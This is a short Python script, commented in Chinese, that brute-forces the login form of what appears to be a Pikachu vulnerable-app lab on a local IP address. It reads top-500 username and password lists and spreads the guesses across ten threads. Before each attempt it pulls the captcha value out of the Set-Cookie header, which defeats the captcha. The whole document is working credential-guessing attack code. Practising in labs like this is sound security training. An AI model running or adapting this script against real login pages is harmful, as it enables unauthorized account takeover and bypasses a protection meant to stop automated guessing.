import requests, ddddocr, threading, re

flag = False
get_result = {}  # 获取结果


# 3.线性的登录爆破  -- 多线程优化速度
def guess_username_password(username_list, password_list):
    global flag, get_result
    for username in username_list:
        for password in password_list:
            if flag:  # 其他线程猜测对了,如果flag为True
                return  # 所有线程就结束了
            print(f"开始尝试用户名{username},密码{password}")
            s = requests.session()
            # 1.获取最新的验证码
            """抓包得知验证码请求头里面有验证码,用正则提取出来即可"""
            verifycode_url = "http://192.168.12.51/pikachu-master/inc/showvcode.php"  # 不要有空格
            verifycode_result = s.get(verifycode_url).headers["Set-Cookie"]
            verifycode = re.findall("bf\[vcode\]=(\w+)", verifycode_result)[0]
            # 2.登录请求
            url = "http://192.168.12.51/pikachu-master/vul/burteforce/bf_server.php"
            data = {"username": username, "password": password, "vcode": verifycode, "submit": "Login"}
            login_result = s.post(url=url, data=data)

            if "username or password is not exists" in login_result.text:
                # 登录失败，应该尝试下一个账号密码
                continue
            else:
                get_result[username] = password
                flag = True  # 设置flag为True
                return  # 所有循环就结束了


if __name__ == '__main__':
    # 1.读取用户名
    with open("../files/usertop500.txt", "r", encoding="utf8") as usernamefile:
        usernames = [username.strip("\n") for username in usernamefile.readlines()]
    # 2.读取密码
    with open("../files/top500.txt", "r", encoding="utf8") as passwordfile:
        passwords = [password.strip("\n") for password in passwordfile.readlines()]
    """划分账户线程,密码不用切片,直接遍历"""
    threads = 10
    username_slice = len(usernames) // threads
    thread_list = []
    for i in range(threads):
        if i != (threads - 1):
            username_list = usernames[i * username_slice:(i + 1) * username_slice]  # 先拿0位,所以是拿[0:width]的切片
        else:
            username_list = usernames[i * username_slice:]  # 最后一个线程获取剩余的所有
        # 创建一个线程,并且跑起来
        t = threading.Thread(target=guess_username_password, args=(username_list, passwords))
        thread_list.append(t)

    # 启动所有线程
    for t in thread_list:
        t.start()
    # 等待所有线程完成
    for t in thread_list:
        t.join()
    print(f"拿到的正确用户名和密码是{get_result}".center(150, "-"))
